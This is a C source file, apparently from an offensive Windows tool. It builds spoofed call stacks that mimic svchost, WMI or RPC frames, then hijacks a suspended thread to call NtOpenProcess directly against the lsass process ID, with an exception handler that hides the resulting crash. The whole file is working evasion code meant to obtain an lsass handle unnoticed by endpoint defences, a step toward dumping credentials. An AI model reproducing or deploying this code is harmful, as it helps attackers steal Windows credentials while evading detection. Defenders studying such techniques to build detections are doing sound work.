#include "spoof_callstack.h"

#ifdef _WIN64

VOID set_frame_info(
    OUT PSTACK_FRAME frame,
    IN LPWSTR path,
    IN DWORD api_hash,
    IN ULONG target_offset,
    IN ULONG target_stack_size,
    IN BOOL dll_load)
{
    memset(frame, 0, sizeof(STACK_FRAME));
    wcsncpy(frame->targetDll, path, wcsnlen(path, MAX_PATH));
    frame->functionHash = api_hash;
    frame->offset = target_offset;
    frame->totalStackSize = target_stack_size;
    frame->requiresLoadLibrary = dll_load;
    frame->setsFramePointer = FALSE;
    frame->returnAddress = 0;
    frame->pushRbp = FALSE;
    frame->countOfCodes = 0;
    frame->pushRbpIndex = 0;
}

VOID set_svchost_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0, 0x2c13e, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x80e5f, 0, TRUE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x60ce6, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x2a7d3, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x2a331, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x66cf1, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x7b59e, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\system32\\sysmain.dll",    0, 0x67ecf, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\svchost.exe",    0, 0x4300,  0, TRUE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\sechost.dll",    0, 0xdf78,  0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\kernel32.dll",   0, 0x17034, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\ntdll.dll",      0, 0x52651, 0, FALSE);
    *number_of_frames = i;
}

VOID set_wmi_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0, 0x2c13e, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0xc669, 0, TRUE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0xc71b, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0x2fde, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0x2b9e, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0x2659, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0x11b6, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0, 0xc144, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\kernel32.dll", 0, 0x17034, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0, 0x52651, 0, FALSE);
    *number_of_frames = i;
}

VOID set_rpc_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0, 0x32ea6, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\lsm.dll",        0, 0xe959,  0, TRUE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x79633, 0, TRUE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x13711, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0xdd77b, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x5d2ac, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x5a408, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x3a266, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x39bb8, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x48a0f, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x47e18, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x47401, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x46e6e, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\RPCRT4.dll",     0, 0x4b542, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\ntdll.dll",      0, 0x20330, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\ntdll.dll",      0, 0x52f26, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\kernel32.dll",   0, 0x17034, 0, FALSE);
    set_frame_info(&callstack[i++], L"C:\\Windows\\SYSTEM32\\ntdll.dll",      0, 0x52651, 0, FALSE);
    *number_of_frames = i;
}

/*
 * Uses the offset within the StackFrame structure to
 * calculate the return address for fake frame.
 */
BOOL calculate_return_address(
    IN OUT PSTACK_FRAME frame)
{
    BOOL ret_val = FALSE;
    PVOID image_base = NULL;
    PVOID func_base = NULL;

    // get library base address
    image_base = (PVOID)get_library_address(frame->targetDll, TRUE);
    if (!image_base)
    {
        DPRINT_ERR("Failed to get image base of %ls", frame->targetDll);
        goto cleanup;
    }

    if (frame->functionHash)
    {
        // get the address of the API
        func_base = get_function_address(
            image_base,
            frame->functionHash,
            0);
        if (!func_base)
        {
            DPRINT_ERR("Could not find function with hash 0x%lx at %ls", frame->functionHash, frame->targetDll);
            goto cleanup;
        }

        // set the return address as image_base!function+offset
        frame->returnAddress = RVA(PVOID, func_base, frame->offset);
    }
    else
    {
        // set the return address as image_base+offset
        frame->returnAddress = RVA(PVOID, image_base, frame->offset);
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

/*
 * Calculates the total stack space used by the fake stack frame. Uses
 * a minimal implementation of RtlVirtualUnwind to parse the unwind codes
 * for target function and add up total stack size. Largely based on:
 * https://github.com/hzqst/unicorn_pe/blob/master/unicorn_pe/except.cpp#L773
 */
BOOL calculate_function_stack_size_internal(
    IN OUT PSTACK_FRAME frame,
    PRUNTIME_FUNCTION pRuntimeFunction,
    DWORD64 image_base)
{
    BOOL ret_val = FALSE;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    BOOL success = TRUE;

    do
    {
        pUnwindInfo = NULL;
        unwindOperation = 0;
        operationInfo = 0;
        index = 0;
        frameOffset = 0 ;
        success = TRUE;
        /*
         * [1] Loop over unwind info.
         * NB As this is a PoC, it does not handle every unwind operation, but
         * rather the minimum set required to successfully mimic the default
         * call stacks included.
         */
        pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + image_base);
        while (index < pUnwindInfo->CountOfCodes)
        {
            unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
            operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
            /*
             * [2] Loop over unwind codes and calculate
             * total stack space used by target function.
             */
            if (unwindOperation == UWOP_PUSH_NONVOL)
            {
                // UWOP_PUSH_NONVOL is 8 bytes.
                frame->totalStackSize += 8;
                // Record if it pushes rbp as
                // this is important for UWOP_SET_FPREG.
                if (RBP_OP_INFO == operationInfo)
                {
                    frame->pushRbp = TRUE;
                    // Record when rbp is pushed to stack.
                    frame->countOfCodes = pUnwindInfo->CountOfCodes;
                    frame->pushRbpIndex = index + 1;
                }
            }
            else if (unwindOperation == UWOP_SAVE_NONVOL)
            {
                //UWOP_SAVE_NONVOL doesn't contribute to stack size
                // but you do need to increment index.
                index += 1;
            }
            else if (unwindOperation == UWOP_ALLOC_SMALL)
            {
                //Alloc size is op info field * 8 + 8.
                frame->totalStackSize += ((operationInfo * 8) + 8);
            }
            else if (unwindOperation == UWOP_ALLOC_LARGE)
            {
                // Alloc large is either:
                // 1) If op info == 0 then size of alloc / 8
                // is in the next slot (i.e. index += 1).
                // 2) If op info == 1 then size is in next
                // two slots.
                index += 1;
                frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                if (operationInfo == 0)
                {
                    frameOffset *= 8;
                }
                else
                {
                    index += 1;
                    frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
                }
                frame->totalStackSize += frameOffset;
            }
            else if (unwindOperation == UWOP_SET_FPREG)
            {
                // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
                // that rbp is the expected value (in the frame above) when
                // it comes to spoof this frame in order to ensure the
                // call stack is correctly unwound.
                frame->setsFramePointer = TRUE;
            }
            else
            {
                PRINT_ERR("Unsupported Unwind Op Code");
                success = FALSE;               
            }
            index += 1;
        }
        if (!success)
            goto cleanup;

        // If chained unwind information is present then we need to
        // also recursively parse this and add to total stack size.
        if (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)
        {
            index = pUnwindInfo->CountOfCodes;
            if (0 != (index & 1))
            {
                index += 1;
            }
            pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        }
    } while(pUnwindInfo->Flags & UNW_FLAG_CHAININFO);

    // Add the size of the return address (8 bytes).
    frame->totalStackSize += 8;

    ret_val = TRUE;

cleanup:
    return ret_val;
}

/*
 * Retrieves the runtime function entry for given fake ret address
 * and calls CalculateFunctionStackSize, which will recursively
 * calculate the total stack space utilisation.
 */
BOOL calculate_function_stack_size(
    IN OUT PSTACK_FRAME frame)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    RtlLookupFunctionEntry_t RtlLookupFunctionEntry = NULL;
    RtlLookupFunctionEntry = (RtlLookupFunctionEntry_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        RtlLookupFunctionEntry_SW2_HASH,
        0);
    if (!RtlLookupFunctionEntry)
    {
        api_not_found("RtlLookupFunctionEntry");
        goto cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given function.
    pRuntimeFunction = RtlLookupFunctionEntry(
        (DWORD64)frame->returnAddress,
        &ImageBase,
        pHistoryTable);
    if (!pRuntimeFunction)
    {
        function_failed("RtlLookupFunctionEntry");
        goto cleanup;
    }

    /*
     * [2] Recursively calculate the total stack size for
     * the function we are "returning" to
     */
    success = calculate_function_stack_size_internal(
        frame,
        pRuntimeFunction,
        ImageBase);
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    return ret_val;
}

/*
 * Takes a target call stack and configures it ready for use
 * via loading any required dlls, resolving module addresses
 * and calculating spoofed return addresses.
 */
BOOL initialize_spoofed_callstack(
    PSTACK_FRAME callstack,
    DWORD number_of_frames)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    PSTACK_FRAME frame = NULL;

    for (DWORD i = 0; i < number_of_frames; i++)
    {
        frame = &callstack[i];

        // [1] Calculate ret address for current stack frame.
        success = calculate_return_address(frame);
        if (!success)
        {
            DPRINT_ERR("Failed to calculate ret address");
            goto cleanup;
        }

        // [2] Calculate the total stack size for ret function.
        success = calculate_function_stack_size(frame);
        if (!success)
        {
            DPRINT_ERR("Failed to calculate the stack size");
            goto cleanup;
        }
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

DWORD dummy_function(LPVOID lpParam)
{
    UNUSED(lpParam);
    DPRINT("Hello from dummy function");
    return 0;
}

// Pushes a value to the stack of a Context structure.
//
VOID push_to_stack(
    PCONTEXT context,
    ULONG64 value)
{
    context->Rsp -= 0x8;
    *(PULONG64)(context->Rsp) = value;
}

VOID initialize_fake_thread_state(
    PSTACK_FRAME callstack,
    DWORD number_of_frames,
    PCONTEXT context)
{
    ULONG64 childSp = 0;
    BOOL bPreviousFrameSetUWOP_SET_FPREG = FALSE;
    PSTACK_FRAME stackFrame = NULL;

    // As an extra sanity check explicitly clear
    // the last RET address to stop any further unwinding.
    push_to_stack(context, 0);

    // [2] Loop through target call stack *backwards*
    // and modify the stack so it resembles the fake
    // call stack e.g. essentially making the top of
    // the fake stack look like the diagram below:
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |   RET ADDRESS  |
    //       ----------------   <--- RSP when NtOpenProcess is called
    //
    for (DWORD i = 0; i < number_of_frames; i++)
    {
        // loop fron the last to the first
        stackFrame = &callstack[number_of_frames - i - 1];

        // [2.1] Check if the last frame set UWOP_SET_FPREG.
        // If the previous frame uses the UWOP_SET_FPREG
        // op, it will reset the stack pointer to rbp.
        // Therefore, we need to find the next function in
        // the chain which pushes rbp and make sure it writes
        // the correct value to the stack so it is propagated
        // to the frame after that needs it (otherwise stackwalk
        // will fail). The required value is the childSP
        // of the function that used UWOP_SET_FPREG (i.e. the
        // value of RSP after it is done adjusting the stack and
        // before it pushes its RET address).
        if (bPreviousFrameSetUWOP_SET_FPREG && stackFrame->pushRbp)
        {
            // [2.2] Check when RBP was pushed to the stack in function
            // prologue. UWOP_PUSH_NONVOls will always be last:
            // "Because of the constraints on epilogs, UWOP_PUSH_NONVOL
            // unwind codes must appear first in the prolog and
            // correspondingly, last in the unwind code array."
            // Hence, subtract the push rbp code index from the
            // total count to work out when it is pushed onto stack.
            // E.g. diff will be 1 below, so rsp -= 0x8 then write childSP:
            // RPCRT4!LrpcIoComplete:
            // 00007ffd`b342b480 4053            push    rbx
            // 00007ffd`b342b482 55              push    rbp
            // 00007ffd`b342b483 56              push    rsi
            // If diff == 0, rbp is pushed first etc.
            DWORD diff = stackFrame->countOfCodes - stackFrame->pushRbpIndex;
            DWORD tmpStackSizeCounter = 0;
            for (ULONG j = 0; j < diff; j++)
            {
                // e.g. push rbx
                push_to_stack(context, 0x0);
                tmpStackSizeCounter += 0x8;
            }
            // push rbp
            push_to_stack(context, childSp);

            // [2.3] Minus off the remaining function stack size
            // and continue unwinding.
            context->Rsp -= (stackFrame->totalStackSize - (tmpStackSizeCounter + 0x8));
            *(PULONG64)(context->Rsp) = (ULONG64)stackFrame->returnAddress;

            // [2.4] From my testing it seems you only need to get rbp
            // right for the next available frame in the chain which pushes it.
            // Hence, there can be a frame in between which does not push rbp.
            // Ergo set this to false once you have resolved rbp for frame
            // which needed it. This is pretty flimsy though so this assumption
            // may break for other more complicated examples.
            bPreviousFrameSetUWOP_SET_FPREG = FALSE;
        }
        else
        {
            // [3] If normal frame, decrement total stack size
            // and write RET address.
            context->Rsp -= stackFrame->totalStackSize;
            *(PULONG64)(context->Rsp) = (ULONG64)stackFrame->returnAddress;
        }

        // [4] Check if the current function sets frame pointer
        // when unwinding e.g. mov rsp,rbp / UWOP_SET_FPREG
        // and record its childSP.
        if (stackFrame->setsFramePointer)
        {
            childSp = context->Rsp;
            childSp += 0x8;
            bPreviousFrameSetUWOP_SET_FPREG = TRUE;
        }
    }
}

//
// Handles the inevitable crash of the fake thread and redirects
// it to gracefully exit via RtlExitUserThread.
//
LONG CALLBACK veh_callback(
    PEXCEPTION_POINTERS ExceptionInfo)
{
    ULONG exceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
    PVOID RtlExitUserThread_addr = NULL;

    RtlExitUserThread_addr = get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlExitUserThread_SW2_HASH,
        0);
    if (!RtlExitUserThread_addr)
    {
        api_not_found("RtlExitUserThread");
        return EXCEPTION_CONTINUE_EXECUTION;
    }


    // [0] If unrelated to us, keep searching.
    if (exceptionCode != STATUS_ACCESS_VIOLATION) return EXCEPTION_CONTINUE_SEARCH;

    // [1] Handle access violation error by gracefully exiting thread.
    if (exceptionCode == STATUS_ACCESS_VIOLATION)
    {
        DPRINT("VEH Exception Handler called");
        DPRINT("Re-directing spoofed thread to RtlExitUserThread");
        ExceptionInfo->ContextRecord->Rip = (DWORD64)RtlExitUserThread_addr;
        ExceptionInfo->ContextRecord->Rcx = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

HANDLE open_handle_with_spoofed_callstack(
    IN DWORD stack_type,
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN DWORD attributes)
{
    DWORD number_of_frames = 0;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    CONTEXT context = { 0 };
    HANDLE hProcess = NULL;
    PVOID pHandler = NULL;
    AddVectoredExceptionHandler_t AddVectoredExceptionHandler = NULL;
    RemoveVectoredExceptionHandler_t RemoveVectoredExceptionHandler = NULL;
    OBJECT_ATTRIBUTES objectAttr = { 0 };
    CLIENT_ID clientId = { 0 };
    PSTACK_FRAME callstack = NULL;
    LARGE_INTEGER delay = { 0 };

    AddVectoredExceptionHandler = (AddVectoredExceptionHandler_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNELBASE_DLL, TRUE),
        AddVectoredExceptionHandler_SW2_HASH,
        0);
    if (!AddVectoredExceptionHandler)
    {
        api_not_found("AddVectoredExceptionHandler");
        goto cleanup;
    }

    RemoveVectoredExceptionHandler = (RemoveVectoredExceptionHandler_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNELBASE_DLL, TRUE),
        RemoveVectoredExceptionHandler_SW2_HASH,
        0);
    if (!RemoveVectoredExceptionHandler)
    {
        api_not_found("RemoveVectoredExceptionHandler");
        goto cleanup;
    }

    callstack = intAlloc(sizeof(STACK_FRAME) * MAX_FRAME_NUM);
    if (!callstack)
    {
        malloc_failed();
        goto cleanup;
    }

    // set the stack type
    switch (stack_type)
    {
        case SVC_STACK:
            DPRINT("using svchost callstack");
            set_svchost_callstack(callstack, &number_of_frames);
            break;
        case WMI_STACK:
            DPRINT("using wmi callstack");
            set_wmi_callstack(callstack, &number_of_frames);
            break;
        case RPC_STACK:
            DPRINT("using rpc callstack");
            set_wmi_callstack(callstack, &number_of_frames);
            break;
        default:
            DPRINT_ERR("Invalid stack type");
            goto cleanup;
    }

    /*
     * [1] Initialise our target call stack to spoof. This
     * will load any required dlls, calculate ret addresses,
     * and individual stack sizes needed to mimic the call stack.
     */
    success = initialize_spoofed_callstack(
        callstack,
        number_of_frames);
    if (!success)
    {
        DPRINT_ERR("Failed to initialize fake call stack");
        goto cleanup;
    }

    /*
     * [2] Create suspended thread.
     * NB Stack can grow rapidly for spoofed call stack
     * so allow for plenty of space. Also start address
     * can be anything at this point.
     */
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        dummy_function,
        NULL,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        0,
        MAX_STACK_SIZE,
        MAX_STACK_SIZE,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateThreadEx", status);
        goto cleanup;
    }

    DPRINT("Created suspended thread");

    // [3] Obtain context struct for suspended thread
    context.ContextFlags = CONTEXT_FULL;
    status = NtGetContextThread(hThread, &context);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtGetContextThread", status);
        goto cleanup;
    }

    // [4.1] Initialise fake thread state.
    DPRINT("Initialising spoofed thread state...");
    initialize_fake_thread_state(
        callstack,
        number_of_frames,
        &context);

    // [4.2] Set arguments for NtOpenProcess.
    // RCX
    context.Rcx = (DWORD64)&hProcess;
    // RDX
    context.Rdx = (DWORD64)permissions;
    // R8
    InitializeObjectAttributes(&objectAttr, NULL, attributes, NULL, NULL);
    context.R8 = (DWORD64)&objectAttr;
    // R9
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)lsass_pid;
    clientId.UniqueThread = 0;
    context.R9 = (DWORD64)&clientId;
    // RIP
    // use direct a syscall by calling our own NtOpenProcess
    context.Rip = (DWORD64)NtOpenProcess;

    // [4.3] Set thread context.
    status = NtSetContextThread(hThread, &context);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetContextThread", status);
        goto cleanup;
    }

    // [5] Register a vectored exception handler. Once the sys call has returned
    // the thread will error out, as it will traverse fake/non existent
    // call stack. This will catch the error and gracefully exit the thread.
    // TODO: implement https://github.com/cradiator/CrMisc/blob/master/VEH/VEH/VEH.cpp
    pHandler = AddVectoredExceptionHandler(
        1,
        (PVECTORED_EXCEPTION_HANDLER)veh_callback);
    if (!pHandler)
    {
        DPRINT_ERR("Failed to add vectored exception handler");
        goto cleanup;
    }

    // [6] Rock and or roll.
    DPRINT("Resuming suspended thread...");
    status = NtResumeThread(hThread, NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtResumeThread", status);
        goto cleanup;
    }

    // [7] Sleep briefly.
    DPRINT("Sleeping for 3 seconds...");
    delay.QuadPart = 3;
    delay.QuadPart *= -10000000;
    NtDelayExecution(FALSE, &delay);

    // [8] Did we get a handle to lsass?
    if (!hProcess)
    {
        DPRINT_ERR("Error: Failed to obtain handle to " LSASS);
        goto cleanup;
    }

cleanup:
    if (callstack)
        intFree(callstack);
    if (hThread)
        NtClose(hThread);
    if (pHandler)
        RemoveVectoredExceptionHandler(pHandler);

    return hProcess;
}

#else
HANDLE open_handle_with_spoofed_callstack(
    IN DWORD stack_type,
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN DWORD attributes)
{
    PRINT_ERR("This function supports x64 only");
    return NULL;
}

#endif
